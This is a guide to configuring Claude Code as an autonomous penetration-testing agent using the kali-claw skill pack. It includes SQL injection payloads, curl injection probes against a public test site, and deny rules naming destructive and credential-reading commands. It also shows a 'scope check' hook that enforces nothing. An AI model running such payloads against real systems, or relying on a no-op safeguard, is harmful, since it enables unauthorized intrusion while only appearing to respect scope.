# kali-claw Skill Pack Migration Guide: Using with Claude Code

> For v0.1.39 | A complete guide to running kali-claw security skill packs (111 skill domains, 518 tools) on Anthropic's official CLI tool, Claude Code

---

## 1. Overview

### 1.1 What is Claude Code?

Claude Code is Anthropic's **official command-line tool** that lets you interact with Claude directly in the terminal. It is not a chatbot wrapper — it is Claude's **native runtime**. Claude Code itself is the execution environment.

**Core capabilities:**

- **CLI interface** — Use Claude directly in the terminal with multi-turn conversations and context management
- **CLAUDE.md project instructions** — A Markdown file in the project root that defines how Claude behaves within that project (similar to a system prompt)
- **Custom Agents (Subagents)** — Specialized prompt files placed in `~/.claude/agents/`, invocable via the Task tool
- **Rules** — Behavioral guidelines placed in `~/.claude/rules/` that apply globally or to specific projects
- **Skills (added in 2025)** — Directory-based skill packs placed in `~/.claude/skills/` that comply with the Agent Skills Open Standard
- **MCP Servers** — Integrate external tools via the Model Context Protocol, letting Claude directly invoke nmap, sqlmap, and other commands
- **Memory System** — Persistent session memory stored in `~/.claude/projects/<project-hash>/`
- **Hooks** — Shell commands that execute automatically before/after tool calls (PreToolUse / PostToolUse / Stop / SessionStart)
- **Output Styles** — Explanatory / Learning / Fast (streaming acceleration)
- **IDE Integration** — Auto-detected and embedded in VS Code / JetBrains
- **Plan Mode** — Toggled with Shift+Tab for structured read-only exploration and planning
- **Background Tasks / Parallel Agents** — `run_in_background` and multiple Task calls in a single message

**Key differences from OpenClaw:**

| Feature | OpenClaw | Claude Code |
|---------|----------|-------------|
| Runtime | Standalone npm framework | Claude's native CLI — no extra framework needed |
| Skill system | Markdown files parsed by the framework | Markdown files + Skills directory + custom agents |
| Tool invocation | Through terminal commands | Through Bash tool + MCP servers |
| Memory persistence | File system (memory/ directory) | File system (~/.claude/projects/) |
| Install dependency | Requires Node.js + OpenClaw | Only Claude Code itself (native installer needs no Node.js) |
| Context window | Limited by framework | Claude's native context (200K+ tokens) |

### 1.2 The Value of kali-claw Skill Packs (v0.1.39)

kali-claw contains **111 security skill domains** and a **518 Kali Linux tool knowledge base**, forming a structured, quantitatively scored body of security testing knowledge:

- **Each skill domain** includes: `SKILL.md` (methodology + YAML frontmatter) + `payloads.md` (attack payloads) + `test-cases.md` (test cases) + `guides/` (deep-dive guides)
- **Root-level configuration**: `SOUL.md` (12 Hacker Laws), `IDENTITY.md` (111-line skill tags), `TOOLS.md` (518 tool inventory)
- **Quality tiers**: 33 Distinguished (92+) / 78 Excellent (80-91.9) / 0 Strong / 0 Weak — **111/111 = 100% Excellent+**
- **Agent Skills Open Standard compliance** — All SKILL.md files use the YAML frontmatter standard published by Anthropic in 2025
- **Companion validation / orchestration scripts** — 10+ Bash scripts under `validation/` (SCORE.sh, orchestrator.sh, scenario-runner.sh, heartbeat.sh, etc.)

**Key advantage:** kali-claw skills are essentially Markdown files that can be **read and used directly by Claude Code, with no format conversion required**. Claude Code's built-in Skill tool natively supports the Agent Skills standard.

### 1.3 Migration Strategy Overview

Migration does not mean "converting formats" — it means correctly placing and referencing existing files. Three migration depths are available:

| Migration Level | Time | Capabilities Gained | Best For |
|----------------|------|---------------------|----------|
| **Minimal** | 5 minutes | Directly reference skill files in Claude Code | Quick experimentation |
| **Standard** | 30 minutes | Custom agents + rules + memory system + Skills directory | Daily use |
| **Complete** | 2-3 hours | MCP tool integration + Hooks automation + orchestration scripts + full agent matrix | Professional pentesters / red teamers |

**Critical constraint:** This guide does NOT suggest modifying, converting, or altering any files in the kali-claw `skills/` directory. kali-claw skills stay exactly as they are. Migration means configuring Claude Code to READ existing kali-claw files, not changing them.

---

## 2. Environment Setup

### 2.1 Install Claude Code (Critical Step)

Claude Code supports three installation methods, ranked by recommendation:

#### Method A: Native Installer (Recommended — No Node.js Required)

Anthropic's officially recommended native binary installer — faster startup and lower memory footprint than the npm package, with no Node.js dependency.

```bash
# macOS / Linux
curl -fsSL https://claude.ai/install.sh | bash

# Verify
claude --version

# First launch (interactive login flow)
claude
```

```powershell
# Windows (PowerShell)
irm https://claude.ai/install.ps1 | iex

# Verify
claude --version
```

**Native installer advantages:**

- No Node.js dependency (friendly to Kali minimal, Alpine, and containerized environments)
- Startup time < 1 second (npm version: ~2-3 seconds)
- Self-contained update mechanism: `claude update`
- Binary size ~50MB, smaller than the npm global package

#### Method B: npm Global Install (Classic — Requires Node.js >= 18)

```bash
# Install
npm install -g @anthropic-ai/claude-code

# Verify
claude --version
```

Use cases: you already have Node.js, want consistency with other npm tools, or want unified upgrades via `npm update -g`.

#### Method C: IDE Auto-Install (VS Code / JetBrains)

Open VS Code or any JetBrains IDE, install the "Claude Code" extension, and the extension will auto-guide CLI installation. After installation, the embedded terminal in the IDE can launch `claude` directly and interoperate with the editor (file highlighting, jump-to-definition, diff view).

#### 2.1.1 Authentication (Required on First Launch)

The first `claude` launch enters an interactive login flow with three options:

| Method | Applicable To | Billing |
|--------|---------------|---------|
| **Claude Pro/Max/Team/Enterprise subscription** | Users with claude.ai subscriptions | Included in subscription (usage limits apply) |
| **Anthropic Console API Key** | Developers / enterprises | Pay-as-you-go per token |
| **Amazon Bedrock / Vertex AI** | Enterprise cloud customers | Billed via cloud provider |

**Login with subscription:** In the terminal, select "Login with Claude.ai" — a browser opens the OAuth page. After authorization, return to the terminal; the token is stored automatically in `~/.claude/credentials.json`.

**Login with API Key:**

```bash
# Option 1: Interactive input (recommended — token goes to keychain)
claude
# Select "Use API key", paste sk-ant-...

# Option 2: Environment variable (for CI / containers)
export ANTHROPIC_API_KEY="sk-ant-api03-..."
claude
```

#### 2.1.2 Configure settings.json (User-Level + Project-Level)

Claude Code configuration is layered (highest priority first):

```
Enterprise policy  >  Project (.claude/settings.json)  >  User (~/.claude/settings.json)
```

**User-level config** `~/.claude/settings.json` (create on first use):

```json
{
  "model": "claude-opus-4-7",
  "env": {
    "ANTHROPIC_API_KEY": "sk-ant-api03-REPLACE_WITH_YOUR_KEY"
  },
  "permissions": {
    "allow": [
      "Bash(nmap:*)",
      "Bash(sqlmap:*)",
      "Bash(dig:*)",
      "Bash(curl:*)",
      "Read(**)",
      "Grep(**)",
      "Glob(**)"
    ],
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(sudo:*)",
      "Read(./.env)",
      "Read(./credentials*)"
    ]
  },
  "outputStyle": "default",
  "alwaysThinkingEnabled": true
}
```

**Project-level config** `<project>/.claude/settings.json` (inside the kali-claw repo):

```json
{
  "permissions": {
    "allow": [
      "Bash(bash validation/*)",
      "Bash(python3 validation/*)",
      "Read(skills/**)",
      "Read(memory/**)"
    ]
  }
}
```

Project-level `allow` rules stack on top of user-level rules.

#### 2.1.3 Common CLI Parameters and Slash Commands

**Launch parameters:**

```bash
claude                          # Interactive (most common)
claude --resume                 # Resume previous session (keeps context)
claude --continue               # Continue previous session (shorthand: -c)
claude -p "Scan 192.168.1.1"    # One-shot print mode, exits after output
claude --model claude-sonnet-4-6 # Temporarily switch model
claude --output-format json     # Output JSON (for script integration)
claude --max-turns 20           # Max 20 turns per session (for CI)
```

**In-session slash commands** (15 most common):

| Command | Purpose |
|---------|---------|
| `/help` | Show all commands |
| `/status` | Current model, token usage, login status |
| `/model` | Switch model (Opus / Sonnet / Haiku) |
| `/clear` | Clear current session context |
| `/compact` | Intelligently compress history (keeps essentials) |
| `/resume` | List recent sessions, pick one to resume |
| `/config` | Edit settings.json |
| `/agents` | List / edit custom subagents |
| `/rules` | List / edit rule files |
| `/hooks` | List / edit hooks |
| `/mcp` | List connected MCP servers |
| `/permissions` | View / modify permission rules |
| `/fast` | Toggle Fast mode (faster Opus output) |
| `/init` | Generate a CLAUDE.md skeleton in the current project |
| `/ide` | Manually trigger IDE integration |

**Common keyboard shortcuts:**

| Shortcut | Purpose |
|----------|---------|
| `Shift+Tab` | Toggle Plan Mode (read-only exploration + planning) |
| `Ctrl+O` | Verbose mode (shows thinking process) |
| `Option+T` / `Alt+T` | Toggle Extended Thinking |
| `Esc` | Interrupt current task |
| `@` | Type a file path and Claude auto-reads it |
| `!` | Prefix to execute a shell command directly (output returns to the conversation) |

#### 2.1.4 Common Install / Startup Issues

| Issue | Solution |
|-------|----------|
| Permission denied (EACCES, npm install) | `sudo npm install -g @anthropic-ai/claude-code` or switch to the native installer |
| npm registry timeout (users in mainland China) | `npm config set registry https://registry.npmmirror.com` |
| Node.js version too low (npm install) | `nvm install --lts` |
| Native installer fails inside containers | Add `--user $(id -u):$(id -g)` in the container, or switch to npm |
| OAuth login hangs | Switch to API Key (`export ANTHROPIC_API_KEY=...`) |
| `claude --version` reports command not found | Verify PATH includes `~/.local/bin` (native) or npm global bin (npm) |
| IDE extension cannot find the CLI | Run `claude --version` once in the IDE terminal so the extension detects it |
| Anthropic endpoint unreachable from your network | Configure HTTP(S)_PROXY environment variables; or use Bedrock / Vertex AI |

### 2.2 Prepare a Kali Linux Environment

Choose one of the three options below:

**Option A: Kali Linux Local Machine (Recommended)**

```bash
# Run Claude Code directly on Kali
nmap --version  # Verify tools are available
sqlmap --version
hydra -h | head -1
```

**Option B: Remote Kali (SSH Access)**

```bash
# Generate SSH key pair
ssh-keygen -t ed25519 -C "kali-claw"

# Copy public key to remote Kali
ssh-copy-id user@kali-host

# Verify connection
ssh user@kali-host "nmap --version && sqlmap --version"
```

**Option C: Docker Container**

```bash
# Pull and start Kali container
docker pull kalilinux/kali-rolling
docker run -it --name kali-env kalilinux/kali-rolling /bin/bash

# Install security tools inside the container
apt update && apt install -y nmap sqlmap nikto hydra metasploit-framework

# Re-enter after exiting
docker start -ai kali-env
```

### 2.3 Clone the kali-claw Workspace

```bash
git clone https://github.com/brucesongs/kali-claw.git
cd kali-claw
```

Verify the file structure (v0.1.39 should contain 111 skill domains):

```bash
ls -la
# Expect: SOUL.md  AGENTS.md  IDENTITY.md  USER.md  MEMORY.md
#         TOOLS.md  HEARTBEAT.md  CHANGELOG.md  CLAUDE.md  VERSION
#         skills/  memory/  chronicle/  validation/  docs/  bak/

ls skills/ | wc -l
# Expect: 111 (or close, depending on version)
```

### 2.4 Environment Checklist

- [ ] Claude Code installed (`claude --version` outputs >= 1.0.x)
- [ ] Authentication completed (`claude` shows "Logged in as ..." on launch)
- [ ] `~/.claude/settings.json` configured with API Key or OAuth token
- [ ] Kali Linux available (local / SSH remote / Docker container)
- [ ] kali-claw cloned, `ls skills/ | wc -l` ≈ 111
- [ ] Basic Kali tools available (`nmap --version` works)
- [ ] Network connectivity to api.anthropic.com works

### 2.5 First-Run Verification (Important)

```bash
cd kali-claw
claude
```

Inside the session, run this verification dialog:

```
> @CLAUDE.md Summarize what this project is

Expected: Claude reads CLAUDE.md and gives a brief description of kali-claw
(must include keywords: 111 skill domains, 12 Hacker Laws, Agent Skills Standard)

> List all subdirectories under skills/, sorted alphabetically

Expected: Claude invokes Bash or Glob and returns ~111 skill domain names

> Read the 12 Hacker Laws from SOUL.md

Expected: Claude reads and restates the 12 laws
```

If all three pass, the environment is ready.

---

## 3. Level 1: Minimal Migration (5 Minutes)

### 3.1 Open the Project Directly

```bash
cd kali-claw
claude
```

When Claude Code starts, it **automatically reads `CLAUDE.md`** from the project root as project instructions. kali-claw's `CLAUDE.md` already contains a project overview and architecture description, so Claude understands this is a security testing knowledge base.

### 3.2 Start Using

Use natural language and let Claude read the relevant skill files. **Using `@` for file references makes Claude auto-read** — more reliable and token-efficient than writing "read xxx":

```
You: @skills/web-sqli/SKILL.md help me analyze a SQL injection vulnerability

Claude: [auto-loads SKILL.md]
        I've loaded the SQL injection skill methodology. This skill covers:
        - Union-based / Error-based / Boolean-blind / Time-blind
        - Double Query / Stacked Queries / Out-of-band
        It also covers a 7-step attack chain: Identify → Fingerprint → Detect → Extract → ...
        Please provide target information.
```

```
You: @skills/web-sqli/payloads.md give me a UNION injection payload

Claude: [loads payloads.md]
        Based on the UNION Injection section in payloads.md, standard payload:

        ' UNION SELECT 1,2,3-- -

        Steps:
        1. Determine column count with ORDER BY: ' ORDER BY 5-- -
        2. Find echo position: ' UNION SELECT 1,2,3-- -
        3. Extract data: ' UNION SELECT database(),version(),user()-- -
```

```
You: Run test TC-S001 from @skills/web-sqli/test-cases.md against http://testphp.vulnweb.com/listproducts.php?cat=1

Claude: [loads test-cases.md, follows TC-S001 steps]
        Step 1: Trigger error with single quote
        [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1'" | head -20
        [Result] MySQL error message leaked

        Step 2: Confirm string-type injection
        [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='1"
        [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='2"
        [Comparison] AND '1'='1 returns normal, AND '1'='2 returns empty

        ✓ SQL injection confirmed (string-type, single-quote closure)
        Recommended next step: use sqlmap for automated extraction
```

### 3.3 Limitations of Minimal Migration

- **You must manually `@` reference skill file paths each time**
- **No persistent memory** — Claude does not remember previous analyses after the session ends
- **No automated agents** — cannot invoke specialized subagents via the Task tool
- **No tool integration** — cannot directly invoke sqlmap, nmap, etc. (unless Claude uses Bash each time)
- **No Skills directory** — Claude does not auto-load frontmatter on each scan

Best for: Quick experiments, one-off tests, single-use tasks.

---

## 4. Level 2: Standard Migration (30 Minutes)

### 4.1 Configure CLAUDE.md (Project Instructions)

Append security agent behavioral instructions to the end of kali-claw's `CLAUDE.md`:

```markdown
## Security Agent Mode

When the user requests security testing, vulnerability analysis, or penetration testing tasks, activate Security Agent Mode:

### Role
You are kali-claw, a senior penetration testing engineer. You operate under the 12 Hacker Laws defined in SOUL.md.

### Behavioral Guidelines
- Read SOUL.md for the 12 Hacker Laws before any security operation
- Always verify authorization scope before testing
- Follow the methodology defined in the relevant SKILL.md
- Use payloads from payloads.md, not improvisation
- Document findings per test-cases.md format
- Never execute destructive commands without explicit user confirmation

### Skill Index (v0.1.39 — 111 domains)

**Web & API**: web-sqli, web-xss, web-ssrf, web-auth-bypass, web-access-control, web-xxe, web-deserialization, file-inclusion, cms-framework-attack, api-security, email-security-deep, browser-qa

**Network & Infra**: network-pentest, recon-osint, osint, network-sniffing-mitm, network-tunneling-proxy, dns-attacks, vpn-attack, sase-sse-attack, email-protocol-attack, voip-sip-attack

**Identity & Enterprise**: ad-ldap-attack, ad-cs-abuse, cloud-identity-attack, pam-privilege-attack, ci-cd-supply-chain-attack, cspm-casb-attack

**Cloud & Container**: cloud-security, container-security, kubernetes-attack, cloud-native-vuln-research, secret-management-attack

**Crypto & Emerging**: crypto-attacks, quantum-crypto-attack, blockchain-web3, llm-red-team, ai-security, ai-agent-security, agentic-pentest

**Mobile / IoT / Embedded**: mobile-security, mobile-app-instrumentation, iot-pentest, firmware-reverse, hardware-security, embedded-rtos-security, bluetooth-rfid-nfc

**Critical Infrastructure**: scada-ics-security, ics-fieldbus-attack, storage-san-attack, hypervisor-introspection, satellite-leo-security, sdr-rf-attack, hf-vhf-radio-attack, 5g-telecom-attack, automotive-vehicle-security, uav-drone-security, physical-security-testing, mainframe-security, game-anticheat-bypass

**Defense & Forensics**: digital-forensics, anti-forensics, threat-hunting, detection-engineering, deception-honeypot

**Meta & Orchestration**: pentest-reporting, article-writing, engagement-manager, security-review, repo-scan, security-bounty-hunter, codebase-onboarding, knowledge-ops, exa-search, deep-research, data-scraper-agent, autonomous-loops, multi-agent-collaboration, council

**Infrastructure Skills**: safety-guard, terminal-ops, search-first, verification-loop, docker-patterns, continuous-learning, chronicle, tool-mastery, mcp-server-patterns, password-attack, post-exploitation, privilege-escalation, exploit-development, payload-generation, av-edr-evasion, steganography, social-engineering, social-intelligence, username-profiling, darkweb-intel, binary-reverse, insecure-design, logging-monitoring, mobile-security, security-misconfiguration, supply-chain-security, vulnerability-assessment, wifi-pentest

When a security task is requested, automatically identify the relevant skill domain and read its SKILL.md first.

### Safety Boundaries
- Only test targets within explicitly authorized scope
- Use safety-guard principles from skills/safety-guard/SKILL.md
- Log all actions to memory/YYYY-MM-DD.md
- Never store credentials or tokens in memory files
```

> Note: This is **appended to CLAUDE.md** — do not modify any files under `skills/`.

### 4.2 Create the Skills Directory (Recommended — Agent Skills Standard Compliant)

Since 2025 Claude Code natively supports the Skills directory — **the cleanest way to reference kali-claw skills** — without converting each skill into an agent file.

**Comparison of two approaches:**

| Approach | Implementation | Pros | Cons |
|----------|----------------|------|------|
| **Skills directory (recommended)** | Symlink `~/.claude/skills/<name>/SKILL.md` to kali-claw's SKILL.md | Claude auto-scans frontmatter; no subagent dispatch needed | Each skill works independently; no orchestration |
| **Subagent approach** | Write references inside `~/.claude/agents/<name>.md` | Can define tool permissions and operating procedures | High maintenance cost when there are many |

**Practical advice:** Build subagents for the 10-20 high-frequency skills; symlink the rest as Skills.

**Operation 1: Batch symlink Skills (mount all 111 skills to Claude's global scope in one shot)**

```bash
mkdir -p ~/.claude/skills
cd /path/to/kali-claw/skills

# Symlink each skill domain into ~/.claude/skills/
for d in */; do
  name="${d%/}"
  ln -sf "$(pwd)/$name" "$HOME/.claude/skills/$name"
done

# Verify
ls -l ~/.claude/skills/ | head -10
# Expect to see a bunch of symlinks -> /path/to/kali-claw/skills/xxx
```

Symlink benefit: when kali-claw updates via `git pull`, Claude sees new content immediately — no recopying needed.

**Operation 2: Make Claude recognize these Skills**

After restarting Claude Code, run this inside a session:

```
> /skills
```

You should see a list of ~111 Skills. You can also invoke them directly:

```
> Use the web-sqli skill to test http://testphp.vulnweb.com/listproducts.php?cat=1

Claude: [scans ~/.claude/skills/web-sqli/SKILL.md, loads frontmatter]
        [reads full SKILL.md, executes per methodology]
```

### 4.3 Create Custom Subagents (for High-Frequency Skills)

Convert the 5-10 most-used skills into subagents, giving them tool permissions and clear operating procedures.

**Create the subagents directory:**

```bash
mkdir -p ~/.claude/agents
```

**Example: web-sqli analyzer subagent** (`~/.claude/agents/web-sqli-analyzer.md`):

```markdown
---
name: web-sqli-analyzer
description: SQL injection vulnerability analysis and exploitation specialist. Covers Union/Blind/Time-based/Error-based/Double Query injection detection, exploitation, and defense recommendations. Use PROACTIVELY for any SQL injection task.
tools:
  - Bash
  - Read
  - Write
  - Grep
  - Glob
  - Skill
  - Task
---

You are a SQL injection security specialist embedded in the kali-claw penetration testing system.

## Knowledge Base

Always read these files for reference when handling SQL injection tasks:
- `skills/web-sqli/SKILL.md` — Complete methodology, tools, and attack chain
- `skills/web-sqli/payloads.md` — Payload collection organized by 10 injection types
- `skills/web-sqli/test-cases.md` — Structured test case templates (TC-S001 to TC-S012)
- `skills/web-sqli/guides/` — Deep-dive guides for advanced techniques

## Operating Procedure

1. **Read SKILL.md first** — Always load the methodology before starting any task
2. **Identify injection type** — Determine if the target shows echo, error, or blind behavior
3. **Follow the attack chain** — Detection -> Fingerprinting -> Exploitation -> Data Extraction
4. **Use structured payloads** — Pull from payloads.md, do not improvise payloads
5. **Document per test-cases.md** — Record findings using TC-SXXX format
6. **Provide defense recommendations** — Always include remediation advice

## Safety Rules

- Only test targets within explicitly authorized scope
- Confirm with the user before any destructive SQL operations (DROP, DELETE, UPDATE)
- Never exfiltrate real user data — use dummy data for proof-of-concept
- Log all findings to memory/YYYY-MM-DD.md

## Response Format

For each finding, include:
- Injection type and location
- Payload used
- Data accessible through this vulnerability
- CVSS severity estimate
- Remediation recommendation

## Tools Priority

1. **sqlmap** for automated detection and exploitation
2. **curl** for manual injection testing
3. **Burp Suite** guidance for complex scenarios (describe steps, user operates Burp)
```

**Subagent examples for v0.1.39 modern enterprise attack surface:**

```bash
# PAM attacker subagent
cat > ~/.claude/agents/pam-attacker.md << 'AGENT_EOF'
---
name: pam-attacker
description: PAM (Privileged Access Management) platform attack specialist. Covers CyberArk PVWA/PSM, BeyondTrust PRA, Delinea Secret Server, One Identity Safeguard, ManageEngine PMP, WALLIX Bastion, Devolutions DVLS, Xton Core. CVE-2025-32564, CVE-2022-2451, CVE-2022-28226, .cue cred file cracking.
tools:
  - Bash
  - Read
  - Grep
  - Glob
  - Skill
---

You are a PAM platform attack specialist. Read skills/pam-privilege-attack/SKILL.md for the 8-vendor methodology. Use payloads from skills/pam-privilege-attack/payloads.md. Map findings to MITRE ATT&CK T1552 (Unsecured Credentials). Always document per test-cases.md.
AGENT_EOF

# CI/CD supply chain attacker subagent
cat > ~/.claude/agents/supply-chain-attacker.md << 'AGENT_EOF'
---
name: supply-chain-attacker
description: CI/CD and software supply chain attack specialist. Jenkins CVE-2024-23897, GitLab CI Runner, GitHub Actions pull_request_target trap, Argo CD CVE-2022-24348, xz-utils CVE-2024-3094 backdoor analysis, dependency confusion, SolarWinds SUNBURST, 3CX, Codecov.
tools:
  - Bash
  - Read
  - Grep
  - Glob
---

You are a CI/CD and software supply chain attack specialist. Read skills/ci-cd-supply-chain-attack/SKILL.md for methodology. Reference payloads from skills/ci-cd-supply-chain-attack/payloads.md. Map findings to MITRE T1195 (Supply Chain Compromise).
AGENT_EOF
```

### 4.4 Create Security Rules

Encode kali-claw's safety principles as Claude Code rules:

```bash
mkdir -p ~/.claude/rules
```

Create `~/.claude/rules/kali-claw-security.md`:

```markdown
# kali-claw Security Rules

## Mandatory Safety Checks

Before ANY security testing command:
- [ ] Target is within explicitly authorized scope
- [ ] User has confirmed the target and test type
- [ ] Safety-guard skill principles have been reviewed
- [ ] No destructive commands without triple confirmation

## The 12 Hacker Laws (from SOUL.md)

1. **First Principles Thinking** — Break problems down to fundamental facts
2. **Divergent Thinking First** — Consider at least 3 solutions before acting
3. **Minimize Attack Surface** — Less exposure means less risk
4. **Defense in Depth** — Never rely on a single layer
5. **Least Privilege** — Grant only necessary access
6. **Assume Breach** — Design assuming attacker is already inside
7. **Obscurity Is Not Security** — Security from design, not hiding
8. **Trust but Verify** — Verify all inputs and outputs
9. **Information Wants to Be Free** — Share knowledge, protect sensitive data
10. **Skill Over Credentials** — Judge by capability
11. **The Weakest Link Is Human** — Always consider human factor
12. **Murphy's Security Law** — If it can be exploited, it will be

## Command Execution Rules

- Never use `rm` — use trash or move to bak/ directory
- Triple confirmation required for destructive operations
- Always log actions to memory/YYYY-MM-DD.md
- Never write sensitive data (API keys, tokens, passwords) to memory files
- Proactively redact sensitive information in responses

## File Operations

- Back up core files to bak/ directory before modification
- Never overwrite SOUL.md, USER.md, IDENTITY.md without user awareness
- Memory files are append-only — do not delete past entries
```

### 4.5 Configure the Memory System

Map kali-claw's memory to Claude Code's memory system.

**Correspondence between the two memory systems:**

| kali-claw Memory | Claude Code Memory | Description |
|-----------------|-------------------|-------------|
| `memory/YYYY-MM-DD.md` | `~/.claude/projects/<hash>/memory/` | Daily session records |
| `MEMORY.md` (root) | Project memory file | Long-term distilled knowledge |
| `chronicle/YYYY-MM/*.md` | Manually maintained | Monthly milestones |

**Configure project memory:**

```bash
# Determine project memory path (Claude Code uses MD5 hash of project path as directory name)
ls ~/.claude/projects/

# Linux
PROJECT_MEMORY=~/.claude/projects/$(echo -n "/path/to/kali-claw" | md5sum | cut -d' ' -f1)/memory

# macOS (use md5 instead of md5sum)
PROJECT_MEMORY=~/.claude/projects/$(echo -n "/path/to/kali-claw" | md5)/memory

mkdir -p "$PROJECT_MEMORY"

# Copy long-term memory
cp MEMORY.md "$PROJECT_MEMORY/long-term-knowledge.md"

# Copy recent daily memory (optional)
cp memory/2026-06-*.md "$PROJECT_MEMORY/"
```

**Using the memory system:**

```
You: Record this SQL injection finding to memory

Claude: [appends finding to ~/.claude/projects/.../memory/2026-06-28.md]
        Recorded. I will still remember this finding in the next session.
```

### 4.6 Project Structure After Standard Migration

```
kali-claw/                           <-- Project root (git-tracked)
├── CLAUDE.md                        <-- Security Agent Mode appended (modified)
├── SOUL.md / IDENTITY.md / ...      <-- All unchanged
├── .claude/
│   └── settings.json                <-- Project-level permissions (new)
├── skills/                          <-- 111 skill domains (unchanged)
├── validation/                      <-- Scoring + orchestration scripts (unchanged)
├── memory/ / chronicle/             <-- Memory files (unchanged)
└── ...

~/.claude/                           <-- User-level config
├── settings.json                    <-- API Key, model, permissions (first-time create)
├── agents/                          <-- Subagents (5-10 high-frequency skills)
│   ├── web-sqli-analyzer.md
│   ├── pam-attacker.md
│   └── supply-chain-attacker.md
├── skills/                          <-- Skills symlinks (111 at once)
│   ├── web-sqli -> /path/kali-claw/skills/web-sqli
│   ├── pam-privilege-attack -> ...
│   └── ... (111 symlinks)
├── rules/
│   └── kali-claw-security.md        <-- Security rules
├── projects/
│   └── <hash>/
│       └── memory/                  <-- Claude Code project memory
└── credentials.json                 <-- OAuth token (auto-generated)
```

---

## 5. Level 3: Complete Migration (2-3 Hours)

### 5.1 MCP Server Integration (Let Claude Invoke Kali Tools Directly)

Through MCP servers, Claude Code can **directly invoke** Kali security tools without manual Bash commands.

**Install the MCP SDK:**

```bash
pip install mcp
# Or uv (faster)
uv pip install mcp
```

**Complete nmap MCP server** (`~/kali-mcp-servers/nmap_server.py`):

```python
#!/usr/bin/env python3
"""nmap MCP Server — Wraps nmap as an MCP tool for Claude Code."""

import subprocess
import json
import sys
from mcp.server import Server
from mcp.types import Tool, TextContent

server = Server("kali-nmap")

@server.list_tools()
async def list_tools():
    return [
        Tool(
            name="nmap_scan",
            description="Run nmap network scan. Supports common scan types.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": "Target IP, hostname, or CIDR (e.g., 192.168.1.1 or 192.168.1.0/24)"
                    },
                    "ports": {
                        "type": "string",
                        "description": "Port range (default: 1-1000)",
                        "default": "1-1000"
                    },
                    "scan_type": {
                        "type": "string",
                        "description": "-sV (version), -sC (scripts), -O (OS), -A (aggressive)",
                        "default": "-sV"
                    },
                    "extra_args": {
                        "type": "string",
                        "description": "Additional nmap arguments",
                        "default": ""
                    }
                },
                "required": ["target"]
            }
        ),
        Tool(
            name="nmap_vuln_scan",
            description="Run nmap vulnerability scan using NSE vuln scripts.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target"}
                },
                "required": ["target"]
            }
        )
    ]

def validate_target(target: str) -> bool:
    if not target or len(target) > 256:
        return False
    blocked = set(";|&`$(){}[]<>!#~")
    return not any(c in blocked for c in target)

def run_nmap(args: list[str], timeout: int = 300) -> str:
    try:
        result = subprocess.run(
            ["nmap"] + args,
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Error: nmap scan timed out after 300 seconds"
    except FileNotFoundError:
        return "Error: nmap not found. Install: sudo apt install nmap"

@server.call_tool()
async def call_tool(name: str, arguments: dict):
    if name == "nmap_scan":
        target = arguments["target"]
        if not validate_target(target):
            return [TextContent(type="text", text="Error: Invalid target")]
        ports = arguments.get("ports", "1-1000")
        scan_type = arguments.get("scan_type", "-sV")
        extra = arguments.get("extra_args", "")
        args = scan_type.split() + ["-p", ports]
        if extra:
            args += extra.split()
        args.append(target)
        return [TextContent(type="text", text=run_nmap(args))]

    elif name == "nmap_vuln_scan":
        target = arguments["target"]
        if not validate_target(target):
            return [TextContent(type="text", text="Error: Invalid target")]
        return [TextContent(type="text", text=run_nmap(["--script", "vuln", target], timeout=600))]

    return [TextContent(type="text", text=f"Unknown tool: {name}")]

if __name__ == "__main__":
    import asyncio
    asyncio.run(server.run())
```

**Configure MCP servers** (project root `.mcp.json`):

```json
{
  "mcpServers": {
    "kali-nmap": {
      "command": "python3",
      "args": ["/Users/YOUR_USERNAME/kali-mcp-servers/nmap_server.py"]
    },
    "kali-sqlmap": {
      "command": "python3",
      "args": ["/Users/YOUR_USERNAME/kali-mcp-servers/sqlmap_server.py"]
    }
  }
}
```

The sqlmap MCP server follows the same pattern — implement `sqlmap_detect` and `sqlmap_dbs` tools using the nmap template.

**Remote Kali MCP configuration** (invoking remote Kali tools via SSH):

```json
{
  "mcpServers": {
    "kali-nmap-remote": {
      "command": "python3",
      "args": ["~/kali-mcp-servers/remote_nmap_server.py"],
      "env": {
        "KALI_HOST": "user@192.168.1.100",
        "KALI_SSH_KEY": "~/.ssh/id_ed25519"
      }
    }
  }
}
```

The remote MCP server invokes nmap via SSH:

```python
# Key modification in remote_nmap_server.py
import os
KALI_HOST = os.environ.get("KALI_HOST", "user@kali-host")
SSH_KEY = os.environ.get("KALI_SSH_KEY", "~/.ssh/id_ed25519")

def run_nmap_remote(args: list[str], timeout: int = 300) -> str:
    ssh_cmd = ["ssh", "-i", SSH_KEY, KALI_HOST, "nmap"] + args
    result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=timeout)
    return result.stdout + result.stderr
```

### 5.2 Hooks Automation (Implementing HEARTBEAT Partially)

**Scope check hook** (PreToolUse) — automatically verifies the target is in authorized scope before executing Bash commands.

Create `~/kali-hooks/check-scope.sh`:

```bash
#!/bin/bash
# Check whether Bash commands are within authorized scope
# Called by Claude Code PreToolUse Hook

INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# Read authorized scope file
SCOPE_FILE=".scope"
if [ ! -f "$SCOPE_FILE" ]; then
    exit 0  # No scope file means no restrictions
fi

# Log execution
echo "[$(date)] Command: $COMMAND" >> .claude-execution.log

# Check if any unauthorized target is referenced
AUTHORIZED_TARGETS=$(grep -v '^#' "$SCOPE_FILE" | grep -v '^$' | tr '\n' '|')
AUTHORIZED_TARGETS="${AUTHORIZED_TARGETS%|}"

# If command contains an IP/hostname not in scope, block it
# (Implementation omitted for brevity — full version uses regex matching)

exit 0
```

Project-level `.scope` file (kali-claw project root):

```
# Authorized Test Targets
# One target per line, # is comment
192.168.1.0/24
testphp.vulnweb.com
*.example.com
```

Configure Hooks in `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash ~/kali-hooks/check-scope.sh"
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
